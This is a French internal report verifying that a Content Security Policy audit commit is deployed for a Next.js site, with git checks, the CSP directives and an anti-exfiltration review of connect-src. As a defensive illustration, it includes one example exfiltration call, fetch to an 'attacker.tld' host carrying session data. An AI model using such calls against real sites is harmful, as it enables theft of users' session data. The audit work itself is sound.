# Vérification déploiement CSP commit `c8db47a` — T-264

> **Cluster** : T-261 (RGPD pré-Live consolidé) / T-200 r1 (doctrine privacy).
> **Scope** : confirmer que le commit `c8db47a` (audit CSP conformité
> anti-exfiltration sessionStorage) est bien mergé sur `master`, que
> `next.config.js` n'a pas dérivé depuis, et que la directive CSP active
> reste restrictive.
> **Date** : 2026-05-06.

---

## TL;DR

**Vérification ✅ conforme.**
- Commit `c8db47a` présent sur `master` (HEAD au moment de la vérification :
  `2426856`). Pas de divergence.
- `next.config.js` : aucune modification entre `c8db47a` et HEAD courant
  (vérifié via `git log c8db47a..HEAD -- next.config.js` → vide).
- Directive `Content-Security-Policy-Report-Only` active, `connect-src`
  restrictif (whitelist explicite, aucun wildcard attacker-controllable).
- Migration Report-Only → Enforce reste cadrée par PCI SAQ-A (cible
  2026-05-12).

→ **T-264 déploiement ✅** dans la checklist pré-Live.

---

## Vérification git

### Commit `c8db47a` sur master

```
$ git log -1 --format="%H %ai %s" c8db47a
c8db47a8d034480979c5d2a3f186ec80bbe2c8b8 2026-05-06 19:45:03 +0200 docs(security): audit CSP T-264 conformite anti-exfiltration sessionStorage

$ git branch --contains c8db47a
* master
```
→ Commit présent sur la branche `master`.

### HEAD courant master
```
$ git rev-parse HEAD
2426856d0a86203a5bdf82790163be5b50f6d474
```

### Divergence `next.config.js` depuis `c8db47a`
```
$ git log c8db47a..HEAD --oneline -- next.config.js
(vide)
```
→ Aucune modification de `next.config.js` depuis le commit d'audit.

---

## Extrait config CSP active (`next.config.js`)

### Headers de sécurité posés
Source : `next.config.js:87-117`.

```
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=(self),
                    payment=(self), interest-cohort=()
Content-Security-Policy-Report-Only: <directives ci-dessous>
```

### Directives CSP (Report-Only)
Source : `next.config.js:25-85` (fonction `buildCSPReportOnly`). Composées
dynamiquement (Supabase host résolu depuis `NEXT_PUBLIC_SUPABASE_URL`).

```
default-src 'self';
script-src 'self' 'unsafe-inline' 'unsafe-eval'
  https://js.stripe.com
  https://m.stripe.network
  https://va.vercel-scripts.com
  blob:;
style-src 'self' 'unsafe-inline';
img-src 'self' data: blob: https:;
font-src 'self' data:;
connect-src 'self'
  https://api.stripe.com
  https://api.mapbox.com
  https://*.tiles.mapbox.com
  https://events.mapbox.com
  https://va.vercel-scripts.com
  https://vitals.vercel-analytics.com
  https://<TERROIR_SUPABASE_HOST>
  wss://<TERROIR_SUPABASE_HOST>;
frame-src 'self'
  https://js.stripe.com
  https://hooks.stripe.com
  https://m.stripe.network;
worker-src 'self' blob:;
object-src 'none';
base-uri 'self';
form-action 'self';
frame-ancestors 'none';
upgrade-insecure-requests;
```

### Audit anti-exfiltration `connect-src`
| Destination | Attacker-controllable ? | Verdict |
|---|---|---|
| `'self'` | non (TerrOir) | OK |
| `api.stripe.com` | non (Stripe) | OK |
| `api.mapbox.com`, `*.tiles.mapbox.com`, `events.mapbox.com` | non (Mapbox) | OK |
| `va.vercel-scripts.com`, `vitals.vercel-analytics.com` | non (Vercel) | OK |
| `<TERROIR_SUPABASE_HOST>` (https + wss) | non (URL exacte) | OK |

→ Aucune destination attacker-controllable. Un script XSS futur exécuté
via `'unsafe-inline'` ne peut PAS exfiltrer `terroir_geo_session` vers
un serveur tiers (chaque `fetch("https://attacker.tld/x?d=...")` est
bloqué en enforce ou signalé en Report-Only).

---

## État application en production

### Mode CSP courant
- `Content-Security-Policy-Report-Only` (mode observation).
- Bascule `Content-Security-Policy` (enforce) prévue 2026-05-12 (cible
  PCI SAQ-A, cf. `docs/security/csp-audit-t-264-2026-05-06.md` § "Trade-off
  conscient — Report-Only vs Enforce").

### Vérification déploiement Vercel (out-of-band)
**Hors scope code lecture seule** : la vérification de l'effectivité
prod (présence du header CSP sur les responses HTTP) nécessite une
inspection runtime (curl `https://www.terroir-local.fr/` + grep
`Content-Security-Policy-Report-Only`). À effectuer par Romain ou via
audit T-003.

Pré-requis vérifiables :
- Le merge sur master est confirmé (cf. § Vérification git).
- La pipeline Vercel auto-deploy sur push master est l'usage convention
  TerrOir.
- Aucun fichier `vercel.json` ou rewrite rule ne court-circuite les
  headers définis dans `next.config.js` (vérifié grep `vercel.json` →
  pas de fichier).

---

## Findings

### F1. Pas de gap configuration vs commit audit
La config CSP active est strictement celle décrite dans
`docs/security/csp-audit-t-264-2026-05-06.md`. Aucune dérive.

### F2. Reminder migration enforce
`Content-Security-Policy-Report-Only` est encore actif. À la cible
2026-05-12 (PCI SAQ-A), basculer vers `Content-Security-Policy` enforce.
Procédure dans `docs/conventions/security-headers.md` § "Migration
Report-Only → enforce".

### F3. Dette nonce-based CSP (T-264-bis implicite)
`'unsafe-inline'` + `'unsafe-eval'` sur `script-src` restent tolérés pour
Next.js / Stripe.js. Migration nonce-based reste tracée comme dette
V1.2+ — non bloquante pré-Live (le `connect-src` restrictif suffit pour
T-264).

---

## Cross-références

- `docs/security/csp-audit-t-264-2026-05-06.md` — audit CSP source.
- `docs/conventions/security-headers.md` — convention vivante headers.
- `docs/security/audit-sessionstorage-non-fuite-tiers-2026-05-06.md`
  (T-253) — articulation : la CSP est la dernière ligne de défense
  contre une exfiltration `terroir_geo_session` en cas d'XSS futur.
- `next.config.js` — source unique de la CSP.

---

## Conclusion

T-264 ✅ déploiement vérifié. Le commit `c8db47a` est sur `master`,
`next.config.js` n'a pas dérivé, la directive `connect-src` reste
restrictive, et aucune exfiltration de `terroir_geo_session` vers un
serveur attacker-controllé n'est possible via la CSP active. Bascule
Report-Only → Enforce reste cadrée 2026-05-12 PCI SAQ-A.
